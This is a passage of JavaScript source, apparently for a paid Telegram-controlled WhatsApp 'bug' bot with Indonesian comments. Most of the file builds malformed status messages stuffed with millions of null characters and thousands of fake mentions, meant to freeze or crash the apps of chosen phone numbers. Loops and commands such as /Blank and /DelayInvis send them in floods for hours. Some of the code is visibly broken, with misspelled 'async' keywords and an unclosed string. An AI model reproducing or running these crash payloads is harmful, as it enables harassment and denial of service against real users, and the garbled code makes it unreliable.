      },
    ],
  });

  if (mention) {
    await zauzet.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function xatanicaldelay(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "Bellakuuu",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await zauzet.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await zauzet.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function VampBroadcast(target, mention) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "assalamualaikum",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "Dont Bothering Me Bro!!!",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await zauzet.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  // **Cek apakah mention true sebelum menjalankan relayMessage**
  if (mention) {
    await zauzet.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "soker tai" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function btnStatus(target, mention) {
  let pesan = await generateWAMessageFromContent(
    target,
    {
      buttonsMessage: {
        text: "🔥",
        contentText: "Xatanical",
        footerText: "Bella",
        buttons: [
          {
            buttonId: ".glitch",
            buttonText: { displayText: "⚡" + "\u0000".repeat(400000) },
            type: 1,
          },
        ],
        headerType: 1,
      },
    },
    {}
  );

  await zauzet.relayMessage("status@broadcast", pesan.message, {
    messageId: pesan.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: zauzet }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await zauzet.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: { protocolMessage: { key: pesan.key, type: 25 } },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Maklo" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function protocolbug6(target, mention) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
          },
          interactiveResponseMessage: {
            body: {
              text: "#ZauzetIsBack",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
              paramsJson: "\u0000".repeat(999999),
              version: 3,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741,
              forwardedNewsletterMessageInfo: {
                newsletterName: "trigger newsletter ( @tamainfinity )",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
              },
            },
          },
        },
      },
    },
    {}
  );

  await zauzet.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await zauzet.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25,
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
                content: undefined,
              },
            ],
          },
        },
      },
      {}
    );
  }
}

async function DurationTrick(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 400) {
        await xatanicaldelay(target, false);
        await VampBroadcast(target, false);;

        console.log(chalk.red(`{Zauzet}{Covjek} ${count}/400 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 400 Messages to ${target}`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 400 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function zauzetdelay(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 400) {
        await xatanicaldelay(target, false);
        await protocolbug3(target, false);
        await btnStatus(target, false);
        await VampBroadcast(target, false);
        await protocolbug6(target, false);
        await TrashProtocol(target, false);

        console.log(chalk.red(`{Zauzet}{Covjek} ${count}/400 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 400 Messages to ${target}`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 400 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function TrashProtocol(target, mention) {
  const sex = Array.from({ length: 9741 }, (_, r) => ({
    title: "᭯".repeat(9741),
    rows: [{ title: `${r + 1}`, id: r + 1 }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "@xatanicvxii",
          listType: 2,
          buttonText: null,
          sections: sex,
          singleSelectReply: { selectedRowId: "🌀" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "( # )",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await zauzet.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await zauzet.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "🌀 𝗧𝗮𝗺𝗮 - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
            content: undefined,
          },
        ],
      }
    );
  }
}

ync function delay2v(sock, target) {
  const Msg = [
    {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
          },
        },
      },
    },
  ];

  const Msg1 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: false,
          viewOnce: false,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1995 }, () => "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "payment_method",
                      paramsJson: "\u0000".repeat(1045000),
                      version: 3,
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
  };

  for (const a of Msg) {
    await sock.relayMessage("status@broadcast", a, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });
  }

  await sock.relayMessage("status@broadcast", Msg1, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: [],
              },
            ],
          },
        ],
      },
    ],
  });

  console.log(` Success send bug to ${target}`);
}

async function Natsk(isTarget, mention) {
console.log(chalk.red("Amelia Kill Data"));
    let payload = "";
    for (let i = 0; i < 900; i++) {
        payload = "\u0000".repeat(2097152);
    }
    
    const mention = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
    ];

    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://iili.io/FvogpYG.jpg",
                    mimetype: "image/jpeg",
                    caption: "Amelia Kill You",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: mention,
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: payload
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

Update Function For PT 

Invisible Nguras Kuota 
👀

asnyc function LocaX(isTarget) {
const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                    name: "sockzX7",
                    address: "\u0000",
                    contextInfo: {
                        mentionedJid: [
                            isTarget,
                            ...Array.from({ length: 1900 }, () =>
                                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: isTarget },
                    content: undefined
                }]
            }]
        }]
    }, {
        participant: isTarget
    });
}
///and func

//=======CASE BUG=========//
bot.onText(/\/Blank (\d+)/, async function ExploitSender (sock, target) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "t.me/sanzz44" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6nzx0v.jpg", {
      caption: `
\`\`\`
- Blank
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- Blank
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 85; i++) {   
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   await Jtwhardfreze(sock, target, false);
   await Jtwhardfreze(sock, target, false);
   delayinvisible(target, mention = false);
   delayinvisible(target, mention = false);
   delayinvisible(target, mention = false);
   await ZhTCover(rizz, target);
   await ZhTCover(rizz, target);
   await ZhTCover(rizz, target);
   await ZhTHasclaw(sock, target, mention);
   await ZhTHasclaw(sock, target, mention);
   await ZhTHasclaw(sock, target, mention);
   await XNecroCrashCrL(target);
   await XNecroCrashCrL(target);
   await XNecroCrashCrL(target);
   await Notifspam(target, Ptcp = true);
   await XNecroInvite(target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- Blank
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/BlankXDelay (\d+)/, async function vXdelay (sock, target) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "t.me/sanzz44 }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "httpshttps://files.catbox.moe/6nzx0v.jpg", {
      caption: `
\`\`\`
- BlankXDelay
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- BlankXDelay
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 85; i++) {   
   delayinvisible(target, mention = false);
   delayinvisible(target, mention = false);
   delayinvisible(target, mention = false);
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   await ZhTCover(rizz, target);
   await ZhTCover(rizz, target);
   await ZhTCover(rizz, target);
   await ZhTHasclaw(sock, target, mention);
   await ZhTHasclaw(sock, target, mention);
   await ZhTHasclaw(sock, target, mention);
   await XNecroCrashCrL(target);
   await XNecroCrashCrL(target);
   await XNecroCrashCrL(target);
   await XNecroInvite(target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- BlankXDelay 
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/DelayInvis (\d+)/, async function LalahMaklu(sock, target) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "t.me/sanzz44" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6nzx0v.jpg", {
      caption: `
\`\`\`
- DELAYINVIS
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- DELAYINVIS
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let r = 0; r < 666; r++) {
    await Jtwhardfreze(sock, target, false);
    await Jtwhardfreze(sock, target, false);
    await Jtwhardfreze(sock, target, false);
    await DelayHard(sock, target);
    await DelayHard(sock, target);
    await DelayHard(sock, target);
    delayinvisible(target, mention = false);
    delayinvisible(target, mention = false);
    delayinvisible(target, mention = false);
    delayinvisible(target, mention = false);
    await ZhTCover(rizz, target);
    await ZhTCover(rizz, target);
    await ZhTCover(rizz, target);
    await ZhTHasclaw(sock, target, mention);
    await ZhTHasclaw(sock, target, mention);
    await ZhTHasclaw(sock, target, mention); 
    await XNecroCrashCrL(target);
    await XNecroCrashCrL(target);  
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- DELAYINVIS
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

